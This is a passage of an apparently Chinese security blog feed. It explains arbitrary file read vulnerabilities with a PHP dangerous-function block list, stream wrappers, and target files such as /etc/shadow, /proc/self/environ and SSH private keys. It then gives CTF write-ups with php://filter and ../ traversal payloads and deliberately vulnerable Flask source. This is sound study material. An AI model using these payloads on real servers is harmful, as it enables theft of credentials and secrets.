src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220805104151328.png" alt="image-20220805104151328"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含漏洞&quot;&gt;&lt;a href=&quot;#文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件包含漏洞&quot;&gt;&lt;/a&gt;文件包含漏洞&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao3-picgo.oss-cn-shenzhen.aliy</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>文件读取</title>
    <link href="https://frankcao3.github.io/posts/15275"/>
    <id>https://frankcao3.github.io/posts/15275</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.981Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804214515223.png" alt="image-20220804214515223"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>攻击者通过一些手段可以读取服务器上开发者不允许读到的文件。</p><p>主要读取的文件是服务器的各种配置文件、文件形式存储的密钥、服务器信息（包括正在执行的进程信息）、历史命令、网络信息、应用源码及二进制程序。</p><h3 id="开发语言相关的触发点"><a href="#开发语言相关的触发点" class="headerlink" title="开发语言相关的触发点"></a>开发语言相关的触发点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">phpinfo()</span><br><span class="line">功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">passthru()</span><br><span class="line">功能描述：允许执行一个外部程序并回显输出，类似于 exec()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">exec()</span><br><span class="line">功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">system()</span><br><span class="line">功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">chroot()</span><br><span class="line">功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式</span><br><span class="line">PHP 时才能工作，且该函数不适用于 Windows 系统。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">scandir()</span><br><span class="line">功能描述：列出指定路径中的文件和目录。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">chgrp()</span><br><span class="line">功能描述：改变文件或目录所属的用户组。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">chown()</span><br><span class="line">功能描述：改变文件或目录的所有者。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">shell_exec()</span><br><span class="line">功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">proc_open()</span><br><span class="line">功能描述：执行一个命令并打开文件指针用于读取以及写入。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">proc_get_status()</span><br><span class="line">功能描述：获取使用 proc_open() 所打开进程的信息。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">error_log()</span><br><span class="line">功能描述：将错误信息发送到指定位置（文件）。</span><br><span class="line">安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode，</span><br><span class="line">执行任意命令。</span><br><span class="line">危险等级：低</span><br><span class="line"></span><br><span class="line">ini_alter()</span><br><span class="line">功能描述：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。</span><br><span class="line">具体参见 ini_set()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">ini_set()</span><br><span class="line">功能描述：可用于修改、设置 PHP 环境配置参数。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">ini_restore()</span><br><span class="line">功能描述：可用于恢复 PHP 环境配置参数到其初始值。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">dl()</span><br><span class="line">功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">pfsockopen()</span><br><span class="line">功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">syslog()</span><br><span class="line">功能描述：可调用 UNIX 系统的系统层 syslog() 函数。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">readlink()</span><br><span class="line">功能描述：返回符号连接指向的目标文件内容。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">symlink()</span><br><span class="line">功能描述：在 UNIX 系统中建立一个符号链接。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">popen()</span><br><span class="line">功能描述：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">stream_socket_server()</span><br><span class="line">功能描述：建立一个 Internet 或 UNIX 服务器连接。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">putenv()</span><br><span class="line">功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数</span><br><span class="line">修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">禁用方法如下：</span><br><span class="line">打开/etc/php.ini文件，</span><br><span class="line">查找到 disable_functions ，添加需禁用的函数名，如下：</span><br><span class="line">phpinfo,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen </span><br></pre></td></tr></table></figure><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><ul><li><p>标准库函数：**file_get_contents()<strong>、</strong>file()<strong>、</strong>fopen()<strong>函数（及其文件指针操作函数</strong>fread()<strong>、</strong>fgets()**等）</p></li><li><p>与文件包含相关的函数（include()、require()、include_once()、require_once()等）</p><p>以及一些<strong>php:&#x2F;&#x2F;伪协议</strong>的使用：（<strong>参考文件包含</strong>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure></li><li><p>通过PHP读文件的执行系统命令（**system()<strong>、</strong>exec()**等）。</p></li><li><p>拓展：php-curl扩展（文件内容作为HTTP body）涉及文件存取的库（如数据库相关扩展、图片相关扩展）、XML模块造成的XXE等。</p></li></ul><blockquote><p><em><strong># 为什么PHP还要还要用这些函数呢？</strong></em></p><p>现在PHP开发技术越来越倾向于单入口、多层级、多通道的模式，其中涉及PHP文件之间的调用密集且频繁。<br>开发者为了写出一个高复用性的文件调用函数，就需要将一些动态的信息传入（如可变的部分文件名）那些函数，如果在程序入口处没有利用switch等分支语句对这些动态输入的数据加以控制，攻击者就很容易注入恶意的路径，从而实现任意文件读取甚至任意文件包含。</p><p><em><strong>Wrapper 机制</strong></em></p><p>PHP向用户提供的指定待打开文件的方式不是简简单单的一个路径，而是一个文件流。我们可以将其简单理解成PHP提供的一套协议。例如，在浏览器中输入http: &#x2F;&#x2F;host: port&#x2F;xxx后，就能通过HTTP请求到远程服务器上对应的文件，而在PHP中有很多功能不同但形式相似的协议，统称为Wrapper，其中最具特色的协议便是php:&#x2F;&#x2F;协议，更有趣的是，PHP提供了接口供开发者编写自定义的wrapper（stream_wrapper_register）。</p><p><em><strong>Filter 机制</strong></em></p><p>PHP中另一个具有特色的机制是Filter，其作用是对目前的Wrapper进行一定的处理（如把当前文件流的内容全部变为大写）。</p><p>对于自定义的Wrapper而言，Filter需要开发者通过stream_filter_register进行注册。</p><p>而PHP内置的一些Wrapper会自带一些Filter，如php:&#x2F;&#x2F;协议存在，所示类型的Filter。</p><p>PHP的Filter特性给我们进行任意文件读取提供了很多便利。</p><p>假设服务端include函数的路径参数可控，正常情况下它会将目标文件当作PHP文件去解析，如果解析的文件中存在“&lt;？php”等PHP的相关标签，那么标签中的内容会被作为PHP代码执行。比较常见的Base64相关的Filter可将文件流编码成Base64的形式，这样读取的文件内容中就不会存在PHP标签。而更严重的是，如果服务端开启了远程文件包含选项allow_url_include，我们就可以直接执行远程PHP代码。</p></blockquote><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>漏洞经常出现在框架<strong>请求静态资源文件</strong>部分，也就是最后读取文件内容的open函数，但直接导致漏洞的成因往往是框架开发者忽略了Python函数的feature。</p><p>涉及文件操作的应用也因为滥用open函数、模板的不当渲染导致任意文件读取。如：将用户输入的某些数据作为文件名的一部分（常见于认证服务或者日志服务）存储在服务器中，在取文件内容的部分也通过将经过处理的用户输入数据作为索引去查找相关文件。<br>攻击者构造软链接放入压缩包，解压后的内容会直接指向服务器相应文件，攻击者访问解压后的链接文件会返回链接指向文件的相应内容。</p><p>Python的模板注入、反序列化等漏洞都可造成一定程度的任意文件读取。</p><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>Java本身的文件读取函数FileInputStream、XXE导致的文件读取。</p><p>Java的一些模块也支持<code>file://</code>协议，这是Java应用中出现任意文件读取最多的地方，如Spring Cloud Config Server路径穿越与任意文件读取漏洞（CVE-2019-3799）、Jenkins任意文件读取漏洞（CVE-2018-1999002）等。</p><h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><p>Ruby的任意文件读取漏洞通常与Rails框架相关。到目前为止，我们已知的通用漏洞为Ruby On Rails远程代码执行漏洞（CVE-2016-0752）、Ruby On Rails路径穿越与任意文件读取漏洞（CVE-2018-3760）、Ruby On Rails路径穿越与任意文件读取漏洞（CVE-2019-5418）。笔者在CTF竞赛中就曾遇到Ruby On Rails远程代码执行漏洞（CVE-2016-0752）的利用。</p><h4 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h4><p>Node.js的express模块曾存在任意文件读取漏洞（CVE-2017-14849)。</p><p>CTF中Node的文件读取漏洞通常为模板注入、代码注入等情况。</p><h3 id="中间件-x2F-服务器相关触发点"><a href="#中间件-x2F-服务器相关触发点" class="headerlink" title="中间件&#x2F;服务器相关触发点"></a>中间件&#x2F;服务器相关触发点</h3><h4 id="Nginx错误配置"><a href="#Nginx错误配置" class="headerlink" title="Nginx错误配置"></a>Nginx错误配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Location /static&#123;</span><br><span class="line">Alias /home/myapp/static/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果配置文件中包含上面这段内容，很可能是运维或者开发人员想让用户可以访问static目录（一般是静态资源目录）。<br>如果用户请求的Web路径是&#x2F;static…&#x2F;，拼接到alias上就变成了&#x2F;home&#x2F;myapp&#x2F;static&#x2F;…&#x2F;，此时便会产生目录穿越漏洞，并且穿越到了myapp目录。</p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>以mysql为例：</p><p>MySQL的load_file()函数可以进行文件读取，但是load_file()函数读取文件首先需要数据库配置FILE权限（数据库root用户一般都有）。<br>其次需要执行load_file()函数的MySQL用户&#x2F;用户组对于目标文件具有可读权限（很多配置文件都是所有组&#x2F;用户可读），主流Linux系统还需要Apparmor配置目录白名单（默认白名单限制在MySQL相关的目录下）。</p><h4 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h4><p>bash命令ln-s可以创建一个指向指定文件的软链接文件，然后将这个软链接文件上传至服务器，当我们再次请求访问这个链接文件时，实际上是请求在服务端它指向的文件。</p><h4 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a>FFmpeg</h4><p>参考一道题目：<a href="https://www.cnblogs.com/iamstudy/articles/2017_quanguo_ctf_web_writeup.html">https://www.cnblogs.com/iamstudy/articles/2017_quanguo_ctf_web_writeup.html</a></p><h4 id="Docker-API"><a href="#Docker-API" class="headerlink" title="Docker-API"></a>Docker-API</h4><p>Docker-API可以控制Docker的行为，一般来说，Docker-API通过UNIX Socket通信，也可以通过HTTP直接通信。<br>当我们遇见SSRF漏洞时，尤其是可以通过SSRF漏洞进行UNIX Socket通信的时候，就可以通过操纵Docker-API把本地文件载入Docker新容器进行读取（利用Docker的ADD、COPY操作），从而形成一种另类的任意文件读取。</p><h3 id="文件读取的目标目录"><a href="#文件读取的目标目录" class="headerlink" title="文件读取的目标目录"></a>文件读取的目标目录</h3><h4 id="x2F-etc下的一些目录"><a href="#x2F-etc下的一些目录" class="headerlink" title="&#x2F;etc下的一些目录"></a>&#x2F;etc下的一些目录</h4><p>&#x2F;etc：&#x2F;etc目录下多是各种应用或系统配置文件，所以其下的文件是进行文件读取的首要目标。</p><ul><li>&#x2F;etc&#x2F;passwd：&#x2F;etc&#x2F;passwd文件是Linux系统保存用户信息及其工作目录的文件，权限是所有用户&#x2F;组可读，一般被用作Linux系统下文件读取漏洞存在性判断的基准。读到这个文件我们就可以知道系统存在哪些用户、他们所属的组是什么、工作目录是什么。</li><li>&#x2F;etc&#x2F;shadow：&#x2F;etc&#x2F;shadow是Linux系统保存用户信息及（可能存在）密码（hash）的文件，权限是root用户可读写、shadow组可读。所以一般情况下，这个文件是不可读的。</li><li>&#x2F;etc&#x2F;apache2&#x2F;*：是Apache配置文件，可以获知Web目录、服务端口等信息。CTF有些题目需要参赛者确认Web路径。</li><li>&#x2F;etc&#x2F;nginx&#x2F;*：是Nginx配置文件（Ubuntu等系统），可以获知Web目录、服务端口等信息。</li><li>&#x2F;etc&#x2F;apparmor(.d)&#x2F;*：是Apparmor配置文件，可以获知各应用系统调用的白名单、黑名单。例如，通过读配置文件查看MySQL是否禁止了系统调用，从而确定是否可以使用UDF（User Defined Functions）执行系统命令。</li><li>&#x2F;etc&#x2F;(cron.d&#x2F;*|crontab)：定时任务文件。有些CTF题目会设置一些定时任务，读取这些配置文件就可以发现隐藏的目录或其他文件。</li><li>&#x2F;etc&#x2F;environment：是环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况。</li><li>&#x2F;etc&#x2F;hostname：表示主机名。</li><li>&#x2F;etc&#x2F;hosts：是主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，参赛者可以探测网卡信息和内网IP&#x2F;域名。</li><li>&#x2F;etc&#x2F;issue：指明系统版本。</li><li>&#x2F;etc&#x2F;mysql&#x2F;*：是MySQL配置文件。</li><li>&#x2F;etc&#x2F;php&#x2F;*：是PHP配置文件。</li></ul><h4 id="x2F-proc目录"><a href="#x2F-proc目录" class="headerlink" title="&#x2F;proc目录"></a>&#x2F;proc目录</h4><p>&#x2F;proc目录通常存储着<strong>进程动态运行的各种信息</strong>，本质上是一种<strong>虚拟文件系统</strong>。&#x2F;proc 文件系统可以被用于收集有用的关于系统和运行中的内核的信息。</p><ul><li><p>&#x2F;proc&#x2F;cpuinfo：CPU 的信息 (型号, 家族, 缓存大小等) </p></li><li><p>&#x2F;proc&#x2F;meminfo：物理内存、交换空间等的信息 </p></li><li><p>&#x2F;proc&#x2F;mounts：已加载的文件系统的列表 </p></li><li><p>&#x2F;proc&#x2F;devices：可用设备的列表 </p></li><li><p>&#x2F;proc&#x2F;filesystems：被支持的文件系统 </p></li><li><p>&#x2F;proc&#x2F;modules：已加载的模块 </p></li><li><p>&#x2F;proc&#x2F;version：内核版本 </p></li><li><p>&#x2F;proc&#x2F;[pid]&#x2F;cmdline：系统启动时输入的内核命令行参数。</p></li><li><p>&#x2F;proc&#x2F;[pid]&#x2F;cwd：通过cwd命令可以直接跳转到当前目录。</p></li><li><p>&#x2F;proc&#x2F;[pid]&#x2F;environ：环境变量中可能存在secret_key，这时也可以通过environ进行读取。</p></li></ul><p>上述路径中的PID是需要填写的进程号，当然我们不知道，但这里我们可以用 <strong>self</strong> 来表示我们自己现在正在用的进程。</p><h4 id="其他目录"><a href="#其他目录" class="headerlink" title="其他目录"></a>其他目录</h4><ul><li><p>Nginx配置文件可能存在其他路径：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;*</p></li><li><p>日志文件：&#x2F;var&#x2F;log&#x2F;*</p></li><li><p>Apache默认Web根目录：&#x2F;var&#x2F;www&#x2F;html</p></li><li><p>PHP session目录：&#x2F;var&#x2F;lib&#x2F;php(5)&#x2F;sessions 可能泄露用户Session</p></li><li><p>用户目录：[user_dir_you_know]&#x2F;.bash_history 历史命令执行</p><p>[user_dir_you_know]&#x2F;.bashrc 部分环变量<br>[user_dir_you_know]&#x2F;.ssh&#x2F;id_rsa(.pub) ssh登录的私钥&#x2F;公钥<br>[user_dir_you_know]&#x2F;.viminfo vim的使用记录</p></li></ul><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>CTF题目：BUUCTF第一章 web入门 <a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p><p>参考：<a href="https://blog.csdn.net/qq_40909772/article/details/121381691">https://blog.csdn.net/qq_40909772/article/details/121381691</a></p><h3 id="afr-1"><a href="#afr-1" class="headerlink" title="afr_1"></a>afr_1</h3><p>使用php伪协议<strong>php:&#x2F;&#x2F;filter</strong>读取文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?p=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><h3 id="afr-2"><a href="#afr-2" class="headerlink" title="afr_2"></a>afr_2</h3><p>先目录扫描发现了img目录，直接进行访问。</p><p>然后尝试回溯目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ec45dcbb-a35f-468b-9d40-51e0a6da2a38.node4.buuoj.cn/img/../</span><br></pre></td></tr></table></figure><h3 id="afr-3"><a href="#afr-3" class="headerlink" title="afr_3"></a>afr_3</h3><p>参考：<strong><a href="https://blog.csdn.net/AAAAAAAAAAAA66/article/details/121490787">https://blog.csdn.net/AAAAAAAAAAAA66/article/details/121490787</a></strong></p><p>随意输入666：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143212419.png" alt="image-20220812143212419"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143223780.png" alt="image-20220812143223780"></p><p>进入article，发现文件参数name，但是没有文件后缀，应该是在后端给加上的：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143253201.png" alt="image-20220812143253201"></p><h4 id="判断文件读取"><a href="#判断文件读取" class="headerlink" title="判断文件读取"></a>判断文件读取</h4><p><strong>判断是否存在文件读取漏洞</strong>，修改参数值试试：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143428107.png" alt="image-20220812143428107"></p><p>发现可以读取其他文件，并且这里的路径为<code>/home/nu11111111l/articles/</code></p><h4 id="尝试读取敏感文件"><a href="#尝试读取敏感文件" class="headerlink" title="尝试读取敏感文件"></a>尝试读取敏感文件</h4><p><strong>尝试回溯路径获取系统文件</strong>，构造payload：<code>article?name=../../../etc/passwd</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143728122.png" alt="image-20220812143728122"></p><p>但是并没有什么信息。</p><h4 id="突破口为-x2F-proc"><a href="#突破口为-x2F-proc" class="headerlink" title="突破口为&#x2F;proc"></a>突破口为&#x2F;proc</h4><p><strong>其实这一题的考点是&#x2F;proc目录的读取</strong></p><p><strong>查看系统启动时执行的命令：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">article?name=../../../proc/self/cmdline</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812144010868.png" alt="image-20220812144010868"></p><p>发现server.py文件，查看该文件内容：</p><p>&#x2F;proc&#x2F;[pid]&#x2F;cwd：通过cwd命令可以直接跳转到当前目录（网站目录）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">article?name=../../../proc/self/cwd/server.py</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143714112.png" alt="image-20220812143714112"></p><p>可以发现文件中执行了 flag.py 和 key.py 这两个文件。通过F12查看源码可以更清楚的查看server.py的内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> ( Flask, render_template, request, url_for, redirect, session, render_template_string )</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line">execfile(<span class="string">&#x27;flag.py&#x27;</span>)</span><br><span class="line">execfile(<span class="string">&#x27;key.py&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">FLAG = flag</span><br><span class="line">app.secret_key = key</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/n1page&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">n1page</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line">    n1code = request.form.get(<span class="string">&quot;n1code&quot;</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># ----------------------------下面的代码存在SSTI模板注入--------------------------</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;n1code&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        session[<span class="string">&#x27;n1code&#x27;</span>] = n1code</span><br><span class="line">    template = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        template = <span class="string">&#x27;&#x27;&#x27;&amp;lt;h1&amp;gt;N1 Page&amp;lt;/h1&amp;gt; &amp;lt;div class=&quot;row&amp;gt; &amp;lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&amp;gt; Hello : %s, why you don&#x27;t look at our &amp;lt;a href=&#x27;/article?name=article&#x27;&amp;gt;article&amp;lt;/a&amp;gt;? &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br><span class="line">        session[<span class="string">&#x27;n1code&#x27;</span>] = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/article&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article</span>():</span><br><span class="line">    error = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">&#x27;article&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> page.find(<span class="string">&#x27;flag&#x27;</span>)&amp;gt;=<span class="number">0</span>:          <span class="comment"># 这里name参数过滤了flag关键词</span></span><br><span class="line">        page = <span class="string">&#x27;notallowed.txt&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        template = <span class="built_in">open</span>(<span class="string">&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(page)).read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        template = e</span><br><span class="line"> 